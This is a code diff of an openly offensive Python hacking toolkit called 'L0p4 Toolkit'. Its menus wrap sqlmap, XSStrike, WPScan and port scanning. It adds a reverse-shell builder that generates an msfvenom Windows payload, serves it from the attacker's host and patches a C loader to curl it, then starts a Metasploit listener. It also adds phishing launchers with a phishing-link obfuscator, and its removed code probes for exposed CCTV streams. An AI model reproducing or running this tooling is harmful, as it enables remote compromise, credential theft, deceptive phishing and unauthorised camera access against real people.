+            │{Fore.MAGENTA}{Style.BRIGHT}          L0p4 TOOLKIT - MAIN MENU           {Fore.GREEN}     │
+            ├{'─'*50}┤
+            │ {Fore.CYAN}[{Fore.WHITE}1{Fore.CYAN}] {Fore.LIGHTGREEN_EX}Network Scanner                        {Fore.GREEN}      │
+            │ {Fore.CYAN}[{Fore.WHITE}2{Fore.CYAN}] {Fore.LIGHTGREEN_EX}DoS Attack                              {Fore.GREEN}     │
+            │ {Fore.CYAN}[{Fore.WHITE}3{Fore.CYAN}] {Fore.LIGHTGREEN_EX}IP Geolocation                         {Fore.GREEN}      │
+            │ {Fore.CYAN}[{Fore.WHITE}4{Fore.CYAN}] {Fore.LIGHTGREEN_EX}CCTV Cam's                              {Fore.GREEN}     │
+            ├{'─'*50}┤
+            │ {Fore.CYAN}[{Fore.RED}0{Fore.CYAN}] {Fore.LIGHTRED_EX}Exit                                      {Fore.GREEN}   │
+            │ {Fore.CYAN}[{Fore.YELLOW}99{Fore.CYAN}] {Fore.YELLOW}Update L0p4 Toolkit                        {Fore.GREEN} │
+            └{'─'*50}┘
+    """
+    print(menu)
+    s = input(f"{Fore.GREEN} root@{username}:~$ {Style.RESET_ALL}")
+    
+    
+    match s:
+        case "1":
+            network()
+        case "2":
+            dos()
+        case "3":
+            ip_geo()
+        case "4":
+            CCTV()
+        case "0":
+            sys.exit()
+        case "99":
+            update_lopa_toolkit()
+
+
+def ask_next_action(current_tool_func, back_to_menu_func, prev_func):
     try:
-        url = f"{protocol}://{ip}:{port}/cgi-bin/magicBox.cgi?action=getSystemInfo"
-        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
-        if resp.status_code == 200:
-            print(f"✅ Found at {url}")
-            print(resp.text.strip())
+        print(f"\n{Fore.YELLOW} [1] Repeat\n [2] {prev_func}\n [3] Main Menu{Style.RESET_ALL}")
+        choice = input(f"{Fore.GREEN} root@{username}:~$ {Style.RESET_ALL}")
+        if choice == "1":
+            current_tool_func()
+        elif choice == "2":
+            clear()
+            text_animation(title, 0.0005)
+            back_to_menu_func()
+        elif choice == "3":
+            main()
         else:
-            print(f"❌ {url} -> HTTP {resp.status_code}")
-    except Exception as e:
-        print(f"⚠️ {e}")
-    search_cve("dahua")
+            print(f"{Fore.RED}Invalid input. Returning to main menu.{Style.RESET_ALL}")
+            main()
+    except KeyboardInterrupt:
+        close_program()
 
-def fingerprint_axis(ip, port):
-    print("➡️  Attempting Axis Fingerprint...")
-    protocol = get_protocol(port)
+##################################################################################################################
+
+
+################################# WEB HACKING ####################################################################
+
+def whois_lookup():
     try:
-        url = f"{protocol}://{ip}:{port}/axis-cgi/admin/param.cgi?action=list"
-        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
-        if resp.status_code == 200:
-            print(f"✅ Found at {url}")
-            for line in resp.text.splitlines():
-                if any(x in line for x in ["root.Brand", "root.Model", "root.Firmware"]):
-                    print(f"🔹 {line.strip()}")
-        else:
-            print(f"❌ {url} -> HTTP {resp.status_code}")
-    except Exception as e:
-        print(f"⚠️ {e}")
-    search_cve("axis")
-
-def fingerprint_cp_plus(ip, port):
-    print("➡️  Attempting CP Plus Fingerprint...")
-    protocol = get_protocol(port)
-    
-    # CP Plus specific endpoints
-    endpoints = [
-        f"{protocol}://{ip}:{port}/",
-        f"{protocol}://{ip}:{port}/index.html",
-        f"{protocol}://{ip}:{port}/login",
-        f"{protocol}://{ip}:{port}/admin",
-        f"{protocol}://{ip}:{port}/cgi-bin",
-        f"{protocol}://{ip}:{port}/api",
-        f"{protocol}://{ip}:{port}/config"
-    ]
-    
-    for url in endpoints:
+        domain = input(f"{Fore.YELLOW}Target domain (e.g. example.com): {Style.RESET_ALL}")
         try:
-            resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
-            if resp.status_code == 200:
-                print(f"✅ Found at {url}")
-                content = resp.text.lower()
-                
-                # Look for CP Plus specific information
-                if 'uvr-0401e1' in content or 'uvr0401e1' in content:
-                    print(f"📸 Model: CP-UVR-0401E1-IC2")
-                if 'cp plus' in content or 'cpplus' in content:
-                    print(f"🏢 Brand: CP Plus")
-                if 'dvr' in content:
-                    print(f"📺 Device Type: DVR")
-                
-                # Print first 500 characters for analysis
-                print(f"📄 Response Preview: {resp.text[:500]}")
-                break
+            w = whois.whois(domain)
+            print(f"{Fore.GREEN}{w}{Style.RESET_ALL}")
         except Exception as e:
-            print(f"⚠️ {e}")
-    
-    search_cve("cp plus")
+            print(f"{Fore.RED}WHOIS error: {e}{Style.RESET_ALL}")
+        ask_next_action(whois_lookup, web_hacking, "Web Hacking")
 
-def fingerprint_generic(ip, port):
-    print("➡️  Attempting Generic Fingerprint...")
-    protocol = get_protocol(port)
-    endpoints = [
-        "/System/configurationFile",
-        "/ISAPI/System/deviceInfo",
-        "/cgi-bin/magicBox.cgi?action=getSystemInfo",
-        "/axis-cgi/admin/param.cgi?action=list",
-        "/",
-        "/index.html",
-        "/login",
-        "/admin",
-        "/cgi-bin",
-        "/api",
-        "/config"
-    ]
-    brand_keywords = {
-        "hikvision": ["hikvision"],
-        "dahua": ["dahua"],
-        "axis": ["axis"],
-        "cp plus": ["cp plus", "cp-plus", "cpplus", "cp_plus", "uvr", "0401e1"],
-    }
-    detected_brand = None
-    for path in endpoints:
-        url = f"{protocol}://{ip}:{port}{path}"
-        try:
-            resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False)
-            if resp.status_code == 200:
-                print(f"✅ Found at {url}")
-                snippet = resp.text[:500]
-                print(snippet)
-                # Try to detect brand in response text or headers
-                text = (resp.text + " " + str(resp.headers)).lower()
-                for brand, keywords in brand_keywords.items():
-                    if any(keyword in text for keyword in keywords):
-                        detected_brand = brand
-                        break
-                if detected_brand:
-                    search_cve(detected_brand)
-                    break  # Continue checking other endpoints
-        except:
-            pass
-    if not detected_brand:
-        print("❌ No common endpoints responded.")
+    except KeyboardInterrupt:
+        close_program()
 
-def check_stream(url):
-    """Enhanced stream detection with multiple methods"""
+
+
+def dns_lookup():
     try:
-        # Method 1: Try HEAD request first
-        response = requests.head(url, timeout=TIMEOUT, verify=False)
-        if response.status_code == 200:
-            # Check content type for video/stream indicators
-            content_type = response.headers.get('Content-Type', '').lower()
-            if any(x in content_type for x in ['video', 'stream', 'mpeg', 'h264', 'mjpeg', 'rtsp', 'rtmp']):
-                return True
-            # Check for common video file extensions in URL
-            if any(x in url.lower() for x in ['.mp4', '.m3u8', '.ts', '.flv', '.webm']):
-                return True
-            # Check for streaming protocols in URL
-            if any(x in url.lower() for x in ['rtsp://', 'rtmp://', 'mms://']):
-                return True
-        
-        # Method 2: Try GET request for better detection
-        response = requests.get(url, timeout=TIMEOUT, verify=False, stream=True)
-        if response.status_code == 200:
-            # Check content type
-            content_type = response.headers.get('Content-Type', '').lower()
-            if any(x in content_type for x in ['video', 'stream', 'mpeg', 'h264', 'mjpeg', 'rtsp', 'rtmp', 'image']):
-                return True
-            
-            # Check for video file extensions in URL
-            if any(x in url.lower() for x in ['.mp4', '.m3u8', '.ts', '.flv', '.webm', '.avi', '.mov']):
-                return True
-            
-            # Check for streaming protocols in URL
-            if any(x in url.lower() for x in ['rtsp://', 'rtmp://', 'mms://', 'rtp://']):
-                return True
-            
-            # Check response content for stream indicators
+        domain = input(f"{Fore.YELLOW}Target domain (e.g. example.com): {Style.RESET_ALL}")
+        try:
+            result = dns.resolver.resolve(domain, 'A')
+            for ip in result:
+                print(f"{Fore.GREEN}[+] IP: {ip}{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.RED}DNS error: {e}{Style.RESET_ALL}")
+        ask_next_action(dns_lookup, web_hacking, "Web Hacking")
+    except KeyboardInterrupt:
+        close_program()
+
+
+
+def load_wordlist(file_path):
+    """Load keywords from the wordlist file."""
+    try:
+        with open(file_path, 'r') as file:
+            wordlist = [line.strip() for line in file if line.strip()]
+        if wordlist:
+            print(f"{Fore.GREEN}[+] Loaded {len(wordlist)} subdomain keywords from {file_path}{Style.RESET_ALL}")
+            return wordlist
+        else:
+            print(f"{Fore.RED}[-] The wordlist file is empty.{Style.RESET_ALL}")
+            return []
+    except FileNotFoundError:
+        print(f"{Fore.RED}[-] Wordlist file not found: {file_path}{Style.RESET_ALL}")
+        return []
+
+
+
+def subdomain_scanner():
+    try:
+        domain = input(f"{Fore.YELLOW}Target domain (e.g. example.com): {Style.RESET_ALL}")
+        wordlist = load_wordlist(".files/big.txt")
+
+        if not wordlist:
+            print(f"{Fore.RED}Aborting scan: no subdomains loaded.{Style.RESET_ALL}")
+            ask_next_action(subdomain_scanner, web_hacking, "Web Hacking")
+            return
+
+        print(f"\n{Fore.YELLOW}[*] Scanning subdomains...{Style.RESET_ALL}")
+        for sub in wordlist:
+            url = f"{sub}.{domain}"
             try:
-                content = response.text.lower()
-                if any(x in content for x in ['stream', 'video', 'live', 'camera', 'mjpg', 'mpeg']):
-                    return True
+                socket.gethostbyname(url)
+                print(f"{Fore.GREEN}[+] Found: {url}{Style.RESET_ALL}")
+            except socket.gaierror:
+                continue
+        ask_next_action(subdomain_scanner, web_hacking, "Web Hacking")
+    except KeyboardInterrupt:
+        close_program()
+
+
+
+def port_scanner():
+    try:
+        target = input(f"{Fore.YELLOW} Target IP or domain: {Style.RESET_ALL}")
+        ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 8080]
+        print(f"{Fore.YELLOW} [*] Scanning ports...{Style.RESET_ALL}\n")
+        for port in ports:
+            s = socket.socket()
+            s.settimeout(1)
+            try:
+                s.connect((target, port))
+                print(f"{Fore.GREEN} [+] Port {port} is OPEN{Style.RESET_ALL}")
             except:
                 pass
-        
-        # Method 3: Check for specific camera stream patterns
-        if any(x in url.lower() for x in ['/video', '/stream', '/live', '/mjpg', '/snapshot']):
-            return True
-            
-    except requests.exceptions.RequestException:
-        pass
-    except Exception as e:
-        pass
-    return False
+            s.close()
+        ask_next_action(port_scanner, web_hacking, "Web Hacking")
+    except KeyboardInterrupt:
+        close_program()
 
-def detect_live_streams(ip, open_ports):
-    """Enhanced live stream detection with better methods"""
-    print(f"\n{C}[🎥] Checking for Live Streams:{W}")
-    found_streams = False
+
+
+def run_wpscan():
+    try:
+        clear()
+        text_animation(title, 0.0005)
+
+        text_animation(f"                                \033[1;37mCreated by \033[1;31mL0pa 💻\033[0m\n", 0.0005)
+        text_animation(f"{Fore.CYAN} \t\t\t\tTikTok: {Style.RESET_ALL}{Fore.LIGHTBLUE_EX}@_.l0pa._\n\n{Style.RESET_ALL}", 0.0005)
+        print(f"{Fore.LIGHTCYAN_EX} --- WPScan Tool ---{Style.RESET_ALL}\n")
+        print(f"{Fore.CYAN}[{Fore.WHITE}1{Fore.CYAN}] Enumerate Usernames")
+        print(f"{Fore.CYAN}[{Fore.WHITE}2{Fore.CYAN}] Enumerate Plugins")
+        print(f"{Fore.CYAN}[{Fore.WHITE}3{Fore.CYAN}] Enumerate Themes")
+        print(f"{Fore.CYAN}[{Fore.WHITE}4{Fore.CYAN}] Full Vulnerability Scan")
+        print(f"\n{Fore.RED}[0] Return to Web Hacking\n{Style.RESET_ALL}")
+
+        choice = input(f"{Fore.GREEN}root@{username}/wpscan:~$ {Style.RESET_ALL}")
+
+        if choice == "0":
+            web_hacking()
+
+        target = input(f"{Fore.YELLOW}Enter the WordPress site URL (e.g., https://target.com): {Style.RESET_ALL}")
+
+        if choice == "1":
+            os.system(f"wpscan --url {target} --enumerate u --random-user-agent")
+        elif choice == "2":
+            os.system(f"wpscan --url {target} --enumerate p --random-user-agent")
+        elif choice == "3":
+            os.system(f"wpscan --url {target} --enumerate t --random-user-agent")
+        elif choice == "4":
+            print(f"{Fore.YELLOW}[*] Launching full scan...{Style.RESET_ALL}")
+            os.system(f'wpscan --url {target} --enumerate "u,vp,vt" --random-user-agent')
+        else:
+            print(f"{Fore.RED}[!] Invalid selection.{Style.RESET_ALL}")
+
+        ask_next_action(run_wpscan, web_hacking, "Web Hacking")
+        print("\n")
+
+    except KeyboardInterrupt:
+        close_program()
+        return
+
+
+def check_wpscan():
+    try:
+        if command_exist("wpscan"):
+            run_wpscan()
+        else:
+            text_animation(f"\n{Fore.CYAN}[+] Installing WPScan...{Style.RESET_ALL}\n", 0.02)
+            if check_distro() == "debian_based":
+                os.system("sudo apt install ruby-full build-essential libcurl4-openssl-dev libssl-dev zlib1g-dev -y && sudo gem install wpscan")
+            elif check_distro() == "arch_based":
+                os.system("sudo pacman -Syu ruby base-devel curl opensshl zlib --noconfirm && sudo gem install wpscan")
+            elif check_distro() == "other_os":
+                text_animation(f"\n{Fore.CYAN}[+] Error, WPScan not installed... {Style.RESET_ALL}\n", 0.02)
+                web_hacking()
+            else:
+                text_animation(f"\n{Fore.CYAN}[+] WPScan Installed! {Style.RESET_ALL}\n", 0.02)
+    except KeyboardInterrupt:
+        close_program()
+
+
+
+def web_hacking():
+    try:
+        menu_intro("Web Hacking")
+
+        print(f"{Fore.CYAN}\n [{Fore.WHITE}1{Fore.CYAN}] SQLMap\n [{Fore.WHITE}2{Fore.CYAN}] xsstrike\n [{Fore.WHITE}3{Fore.CYAN}] WPScan\n [{Fore.WHITE}4{Fore.CYAN}] WHOIS Lookup\n [{Fore.WHITE}5{Fore.CYAN}] DNS Lookup\n [{Fore.WHITE}6{Fore.CYAN}] Subdomain Scanner\n [{Fore.WHITE}7{Fore.CYAN}] Port Scanner\n\n [{Style.RESET_ALL}{Fore.RED}0{Fore.CYAN}] Menu{Style.RESET_ALL}\n")
+        s = input(f"{Fore.GREEN} root@{username}/WebHacking:~$ {Style.RESET_ALL}")
+
+
+        if s == "1":
+            url = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter Target URL: {Style.RESET_ALL}")
+            run_sqlmap(url)
+        elif s == "2":
+            url = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter Target URL: {Style.RESET_ALL}")
+            run_xsstrike(url)
+        elif s == "3":
+            check_wpscan()
+        elif s == "4":
+            whois_lookup()
+        elif s == "5":
+            dns_lookup()
+        elif s == "6":
+            subdomain_scanner()
+        elif s == "7":
+            port_scanner()
+        elif s == "0":
+            main()
+        else:
+            web_hacking()
+
+    except KeyboardInterrupt:
+        close_program()
+            
+
+
+def run_sqlmap(url):
+    try:
+        command = f"sqlmap -u {url} --batch --level=5 --risk=3"
+        subprocess.run(command, shell=True)
+        ask_next_action(run_sqlmap, web_hacking, "Web Hacking")
+    except KeyboardInterrupt:
+        close_program()
+
+
+def run_xsstrike(url):
+    try:
+        command = f"python3 .files/.web/XSStrike/xsstrike.py -u {url} --crawl"
+        subprocess.run(command, shell=True)
+        ask_next_action(run_xsstrike, web_hacking, "Web Hacking")
+    except KeyboardInterrupt:
+        close_program()
+
+##############################################################################################################################
+
+
+############################################## REMOTE ACCESS #################################################################
+
+
+def remote_access():
+    menu_intro("Remote Access")
+
+    print(f" {Fore.CYAN}[{Fore.WHITE}1{Fore.CYAN}] FUD Reverse Shell")
+
+    print(f"\n [{Style.RESET_ALL}{Fore.RED}0{Fore.CYAN}] Menu{Style.RESET_ALL}")
+
+    s = input(f"\n{Fore.GREEN} root@{username}/RemoteAccess:~$ {Style.RESET_ALL}")
+
+    match s:
+        case "1":
+            revshell(".files/.payload/main.c")
+        case "0":
+            main()
     
-    # Common streaming protocols and their default ports
-    streaming_ports = {
-        'rtsp': [554, 8554, 10554],  # Multiple RTSP ports
-        'rtmp': [1935, 1936],
-        'http': [80, 8080, 8000, 8001],
-        'https': [443, 8443, 8444],
-        'mms': [1755],
-        'onvif': [3702, 80, 443],  # ONVIF discovery and streaming
-        'vlc': [8080, 8090]  # VLC streaming ports
-    }
+
+def update_c_file(c_file_path, ip, port, output_path):
+    import re
+    with open(c_file_path, "r") as file:
+        content = file.read()
+
+    new_command = f'char *command = "curl http://{ip}:{port}/code.bin";'
+    content = re.sub(r'char \*command = "curl http://.*";', new_command, content)
+
+    with open(output_path, "w") as file:
+        file.write(content)
+
+
+def revshell(template_c_path):
+    menu_intro("Reverse Shell")
+
+    if not is_command_available("msfvenom"):
+        temp_dir = "/tmp/msf_install"
+        os.makedirs(temp_dir, exist_ok=True)
+        current_dir = os.getcwd()
+        os.chdir(temp_dir)
+
+        text_animation(f"{Fore.YELLOW}[-] msfvenom not found, starting Metasploit installation...{Style.RESET_ALL}\n", 0.05)
+        if check_distro() == "debian_based":
+            subprocess.run(
+            ["sudo", "apt", "install", "gpgv2", "autoconf", "bison", "build-essential", "postgresql",
+             "libaprutil1", "libgmp3-dev", "libpcap-dev", "openssl", "libpq-dev", "libreadline6-dev",
+             "libsqlite3-dev", "libssl-dev", "locate", "libsvn1", "libtool", "libxml2", "libxml2-dev",
+             "libxslt-dev", "wget", "libyaml-dev", "ncurses-dev", "postgresql-contrib", "xsel",
+             "zlib1g", "zlib1g-dev", "curl", "-y"],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            subprocess.run(
+                ["sudo", "curl", "https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb",
+                 "-o", "msfinstall"],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            subprocess.run(
+                ["sudo", "chmod", "755", "msfinstall"],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            subprocess.run(
+                ["./msfinstall"],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+
+            text_animation(f"{Fore.GREEN}[+] Metasploit Framework successfully installed!{Style.RESET_ALL}", 0.05)
+            os.chdir(current_dir)
+        elif check_distro() == "arch_based":
+            subprocess.run(
+                ["sudo", "pacman", "-Sy", "--noconfirm", "base-devel", "postgresql", "libgmp", "libpcap", "openssl",
+                 "libpq", "readline", "sqlite", "curl", "wget", "ncurses", "zlib", "git"],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            subprocess.run(
+                ["yay", "-S", "--noconfirm", "metasploit"],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+        else:
+            current_dir = os.getcwd()
+
+    payload_dir = os.path.join(current_dir, "payloads")
+    os.makedirs(payload_dir, exist_ok=True)
+
+    ip = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter your local IP (LHOST) > {Style.RESET_ALL}")
+    port = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter port (LPORT) > {Style.RESET_ALL}")
+
+    payload_path = os.path.join(payload_dir, "payload.bin")
+    text_animation(f"\n{Fore.CYAN}[-] Generating payload with msfvenom...{Style.RESET_ALL}", 0.04)
+    subprocess.run(
+        ["msfvenom", "-p", "windows/x64/shell_reverse_tcp", f"LHOST={ip}", f"LPORT={port}", "-f", "raw", "-o", payload_path],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    text_animation(f"\n{Fore.GREEN}[+] Payload generated and saved at: {payload_path}{Style.RESET_ALL}", 0.05)
+
+    server_port = input(f"\n\n{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter port to start Python HTTP server > {Style.RESET_ALL}")
+    server_cmd = f"cd {payload_dir} && python3 -m http.server {server_port}"
+    os.system(f'gnome-terminal -- bash -c "{server_cmd}; exec bash"')
+    text_animation(f"\n{Fore.YELLOW}[i] Python HTTP server started in new terminal at port {server_port}{Style.RESET_ALL}\n", 0.05)
+
+    modified_c_path = os.path.join(payload_dir, "FUD.c")
+    update_c_file(template_c_path, ip, server_port, modified_c_path)
+    text_animation(f"\n{Fore.GREEN}[+] Modified C payload saved at: {modified_c_path}{Style.RESET_ALL}\n", 0.05)
+
+    with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=".rc") as rc_file:
+        rc_file.write(
+            f"use exploit/multi/handler\n"
+            f"set payload windows/x64/shell_reverse_tcp\n"
+            f"set LHOST {ip}\n"
+            f"set LPORT {port}\n"
+            f"exploit -j -z\n"
+        )
+        rc_path = rc_file.name
+
+    os.system(f'gnome-terminal -- bash -c "msfconsole -r {rc_path}; exec bash"')
+    text_animation(f"\n{Fore.YELLOW}[i] Metasploit listener started in new terminal{Style.RESET_ALL}\n", 0.05)
+
+
+###############################################################################################################################
+
+
+R = '\033[31m'  # red
+G = '\033[32m'  # green
+C = '\033[36m'  # cyan
+W = '\033[0m'   # white
+Y = '\033[33m'  # yellow
+
+
+
+def show_loading_screen():
+    frames = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
+    for _ in range(10):  
+        for frame in frames:
+            sys.stdout.write(f"\r{C}Processing... {frame}{W}")
+            sys.stdout.flush()
+            time.sleep(0.1)
+    sys.stdout.write("\r\033[K") 
+
+
+def link_mask():
+    menu_intro("L0p4's Phishing Link Obfuscator")
     
-    # Enhanced stream paths for different camera brands
-    stream_paths = {
-        'rtsp': [
-            # Generic paths
-            '/live.sdp',
-            '/h264.sdp',
-            '/stream1',
-            '/stream2',
-            '/main',
-            '/sub',
-            '/video',
-            '/cam/realmonitor',
-            '/Streaming/Channels/1',
-            '/Streaming/Channels/101',
-            # Brand-specific paths
-            '/onvif/streaming/channels/1',  # ONVIF
-            '/axis-media/media.amp',  # Axis
-            '/axis-cgi/mjpg/video.cgi',  # Axis
-            '/cgi-bin/mjpg/video.cgi',  # Generic
-            '/cgi-bin/hi3510/snap.cgi',  # Hikvision
-            '/cgi-bin/snapshot.cgi',  # Generic
-            '/cgi-bin/viewer/video.jpg',  # Generic
-            '/img/snapshot.cgi',  # Generic
-            '/snapshot.jpg',  # Generic
-            '/video/mjpg.cgi',  # Generic
-            '/video.cgi',  # Generic
-            '/videostream.cgi',  # Generic
-            '/mjpg/video.mjpg',  # Generic
-            '/mjpg.cgi',  # Generic
-            '/stream.cgi',  # Generic
-            '/live.cgi',  # Generic
-            '/live/0/onvif.sdp',  # ONVIF
-            '/live/0/h264.sdp',  # Generic
-            '/live/0/mpeg4.sdp',  # Generic
-            '/live/0/audio.sdp',  # Generic
-            '/live/1/onvif.sdp',  # ONVIF
-            '/live/1/h264.sdp',  # Generic
-            '/live/1/mpeg4.sdp',  # Generic
-            '/live/1/audio.sdp'  # Generic
-        ],
-        'rtmp': [
-            '/live',
-            '/stream',
-            '/hls',
-            '/flv',
-            '/rtmp',
-            '/live/stream',
-            '/live/stream1',
-            '/live/stream2',
-            '/live/main',
-            '/live/sub',
-            '/live/video',
-            '/live/audio',
-            '/live/av',
-            '/live/rtmp',
-            '/live/rtmps'
-        ],
-        'http': [
-            # Generic paths
-            '/video',
-            '/stream',
-            '/mjpg/video.mjpg',
-            '/cgi-bin/mjpg/video.cgi',
-            '/axis-cgi/mjpg/video.cgi',
-            '/cgi-bin/viewer/video.jpg',
-            '/snapshot.jpg',
-            '/img/snapshot.cgi',
-            # Brand-specific paths
-            '/onvif/device_service',  # ONVIF
-            '/onvif/streaming',  # ONVIF
-            '/axis-cgi/com/ptz.cgi',  # Axis
-            '/axis-cgi/param.cgi',  # Axis
-            '/cgi-bin/snapshot.cgi',  # Generic
-            '/cgi-bin/hi3510/snap.cgi',  # Hikvision
-            '/cgi-bin/viewer/video.jpg',  # Generic
-            '/img/snapshot.cgi',  # Generic
-            '/snapshot.jpg',  # Generic
-            '/video/mjpg.cgi',  # Generic
-            '/video.cgi',  # Generic
-            '/videostream.cgi',  # Generic
-            '/mjpg/video.mjpg',  # Generic
-            '/mjpg.cgi',  # Generic
-            '/stream.cgi',  # Generic
-            '/live.cgi',  # Generic
-            # Additional paths
-            '/api/video',  # API endpoints
-            '/api/stream',
-            '/api/live',
-            '/api/video/live',
-            '/api/stream/live',
-            '/api/camera/live',
-            '/api/camera/stream',
-            '/api/camera/video',
-            '/api/camera/snapshot',
-            '/api/camera/image',
-            '/api/camera/feed',
-            '/api/camera/feed/live',
-            '/api/camera/feed/stream',
-            '/api/camera/feed/video',
-            # CP Plus specific paths
-            '/cgi-bin/snapshot.cgi',
-            '/cgi-bin/video.cgi',
-            '/cgi-bin/stream.cgi',
-            '/cgi-bin/live.cgi'
-        ]
-    }
+    s = pyshorteners.Shortener()
+
+    shorteners = [
+        s.tinyurl,
+        s.dagd,
+        s.clckru,
+        s.osdb,
+    ]
+
+    def mask_url(domain, keyword, url):
+        parsed_url = urlparse(url)
+        return f"{parsed_url.scheme}://{domain}-{keyword}@{parsed_url.netloc}{parsed_url.path}"
+
+    try:
+        while True:
+            web_url = input(f"{G}Enter the original link {W}(ex: https://www.google.com): {W}")
+            if re.match(r'^(https?://)[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(:\d{1,5})?(/.*)?$', web_url):
+                break
+            print("Invalid URL format. Please provide a valid web URL.")
+
+        while True:
+            custom_domain = input(f"\n{Y}Enter your custom domain {W}(ex: gmail.com): {W}")
+            if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', custom_domain):
+                break
+            print("Invalid custom domain. Please provide a valid domain name.")
+
+        while True:
+            phish = input(f"\n{Y}Enter phishing keywords {W}(ex: account, login): {W}")
+            if " " not in phish and len(phish) <= 15:
+                break
+            print("Phishing keywords should not contain spaces and must be under 15 characters.")
+
+        show_loading_screen()
+        short_urls = []
+        for i, shortener in enumerate(shorteners):
+            try:
+                short_url = shortener.short(web_url)
+                short_urls.append(short_url)
+            except pyshorteners.exceptions.ShorteningErrorException as e:
+                print(f"{R}Error shortening URL with Shortener {i + 1}: {W}{str(e)}")
+                continue
+            except Exception as e:
+                print(f"{R}An unexpected error occurred with Shortener {i + 1}: {W}{str(e)}")
+                continue
+
+        print(f"\n{R}Original URL:{W}", web_url, "\n")
+        print(f"{G}[~] {G}Masked URL {Y}(using multiple shorteners):{W}")
+        for i, short_url in enumerate(short_urls):
+            masked_url = mask_url(custom_domain, phish, short_url)
+            print(f"{G}╰➤ {C}Shortener {W} {i + 1}: {masked_url}")
+
+    except Exception as e:
+        print(f"{R}An error occurred: {W}{str(e)}")
+        
+    ask_next_action(link_mask, main, "Phishing")
+
     
-    def check_stream_with_details(url):
-        """Check stream and provide detailed information"""
-        try:
-            response = requests.get(url, timeout=TIMEOUT, verify=False, stream=True)
-            if response.status_code == 200:
-                content_type = response.headers.get('Content-Type', '').lower()
-                content_length = response.headers.get('Content-Length', '0')
-                
-                # Check if it's actually a stream/video
-                if any(x in content_type for x in ['video', 'stream', 'mpeg', 'h264', 'mjpeg', 'image']):
-                    print(f"  ✅ Stream Found: {url}")
-                    print(f"     📺 Content-Type: {content_type}")
-                    print(f"     📏 Content-Length: {content_length}")
-                    return True
-                elif any(x in url.lower() for x in ['.mp4', '.m3u8', '.ts', '.flv', '.webm', '.avi', '.mov']):
-                    print(f"  ✅ Video File: {url}")
-                    print(f"     📺 Content-Type: {content_type}")
-                    return True
-                elif any(x in url.lower() for x in ['rtsp://', 'rtmp://', 'mms://', 'rtp://']):
-                    print(f"  ✅ Streaming URL: {url}")
-                    return True
-                elif any(x in url.lower() for x in ['/video', '/stream', '/live', '/mjpg', '/snapshot']):
-                    print(f"  ✅ Potential Stream: {url}")
-                    print(f"     📺 Content-Type: {content_type}")
-                    return True
-        except Exception as e:
+
+def phishing():
+    try:
+        menu_intro("Phishing")
+        print(f" {Fore.CYAN}[{Fore.WHITE}1{Fore.CYAN}] Webcam & Location Phishing")
+        print(f" [{Fore.WHITE}2{Fore.CYAN}] Credential Phishing")
+        print(f" [{Fore.WHITE}3{Fore.CYAN}] Phishing Link Obfuscator")
+
+
+        print(f"\n [{Style.RESET_ALL}{Fore.RED}0{Fore.CYAN}] Menu{Style.RESET_ALL}")
+
+
+        s = input(f"\n{Fore.GREEN} root@{username}/phishing:~$ {Style.RESET_ALL}")
+
+        if s == "1":
+            os.system("bash .files/.phishing/L0p4-CamPhisher/L0p4-CamPhisher.sh")
+        elif s == "2":
+            os.system("python3 .files/.phishing/PyPhisher/pyphisher.py")
+        elif s == "3":
+            link_mask()
+        elif s == "0":
+            main()
+        else: 
             pass
-        return False
-    
-    # Check all ports for streams with threading
-    threads = []
-    max_concurrent = 30
-    
-    for port in open_ports:
-        # Check RTSP streams
-        if port in streaming_ports['rtsp']:
-            for path in stream_paths['rtsp']:
-                url = f"rtsp://{ip}:{port}{path}"
-                thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
-                thread.daemon = True
-                threads.append(thread)
-                thread.start()
-                found_streams = True
-                
-                if len(threads) >= max_concurrent:
-                    for t in threads:
-                        t.join()
-                    threads = []
-        
-        # Check RTMP streams
-        if port in streaming_ports['rtmp']:
-            for path in stream_paths['rtmp']:
-                url = f"rtmp://{ip}:{port}{path}"
-                thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
-                thread.daemon = True
-                threads.append(thread)
-                thread.start()
-                found_streams = True
-                
-                if len(threads) >= max_concurrent:
-                    for t in threads:
-                        t.join()
-                    threads = []
-        
-        # Check HTTP/HTTPS streams
-        if port in streaming_ports['http'] + streaming_ports['https']:
-            protocol = 'https' if port in streaming_ports['https'] else 'http'
-            for path in stream_paths['http']:
-                url = f"{protocol}://{ip}:{port}{path}"
-                thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
-                thread.daemon = True
-                threads.append(thread)
-                thread.start()
-                found_streams = True
-                
-                if len(threads) >= max_concurrent:
-                    for t in threads:
-                        t.join()
-                    threads = []
-        
-        # Check MMS streams
-        if port in streaming_ports['mms']:
-            url = f"mms://{ip}:{port}"
-            thread = threading.Thread(target=lambda u=url: check_stream_with_details(u) or None)
-            thread.daemon = True
-            threads.append(thread)
-            thread.start()
-            found_streams = True
-            
-            if len(threads) >= max_concurrent:
-                for t in threads:
-                    t.join()
